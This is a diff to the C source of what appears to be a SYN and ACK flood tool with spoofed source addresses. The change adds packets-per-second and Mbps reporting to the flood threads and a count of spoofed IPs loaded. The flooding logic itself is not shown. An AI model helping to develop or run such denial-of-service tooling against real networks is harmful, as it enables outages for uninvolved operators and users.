@@ -216,6 +216,8 @@ void *syn_flood_attack_thread(void *param)
     uint32_t ticksNow;
     int64_t lastTxPackets = leef_if_tx_packets(interface);
     int64_t txPackets;
+    int64_t lastTxBytes = leef_if_tx_bytes(interface);
+    int64_t txBytes;
 
     while(running) {
         ticksNow = leef_get_ticks();
@@ -224,10 +226,15 @@ void *syn_flood_attack_thread(void *param)
         if(!do_diagnostics) {
             if(ticksNow - lastTicks >= 1000) {
                 txPackets = leef_if_tx_packets(interface);
-                printf("%s TX packets: %d/s\n", interface, (int)(txPackets - lastTxPackets));
+                txBytes = leef_if_tx_bytes(interface);
+                printf("%s TX: %d pkt/s, %.02f Mbps\n",
+                    interface,
+                    (int)(txPackets - lastTxPackets),
+                    ((txBytes - lastTxBytes)*8)/1000000.0);
                 fflush(stdout);
                 lastTicks = ticksNow;
                 lastTxPackets = txPackets;
+                lastTxBytes = txBytes;
             }
         }
 
@@ -261,6 +268,8 @@ void *ack_flood_attack_thread(void *param)
     uint32_t ticksNow;
     int64_t lastTxPackets = leef_if_tx_packets(interface);
     int64_t txPackets;
+    int64_t lastTxBytes = leef_if_tx_bytes(interface);
+    int64_t txBytes;
 
     while(running) {
         ticksNow = leef_get_ticks();
@@ -269,10 +278,15 @@ void *ack_flood_attack_thread(void *param)
         if(!do_diagnostics) {
             if(ticksNow - lastTicks >= 1000) {
                 txPackets = leef_if_tx_packets(interface);
-                printf("%s TX packets: %d/s\n", interface, (int)(txPackets - lastTxPackets));
+                txBytes = leef_if_tx_bytes(interface);
+                printf("%s TX: %d pkt/s, %.02f Mbps\n",
+                    interface,
+                    (int)(txPackets - lastTxPackets),
+                    ((txBytes - lastTxBytes)*8)/1000000.0);
                 fflush(stdout);
                 lastTicks = ticksNow;
                 lastTxPackets = txPackets;
+                lastTxBytes = txBytes;
             }
         }
         src_ip = get_a_src_ip();
@@ -482,6 +496,8 @@ int main(int argc, char **argv)
                         fclose(fp);
 
                         spoof_addresses_size = ch;
+
+                        printf("done, read %d ips\n", spoof_addresses_size);
                     } else {
                         fprintf(stderr, "failed opening spoof ips file!\n");
                         return -1;
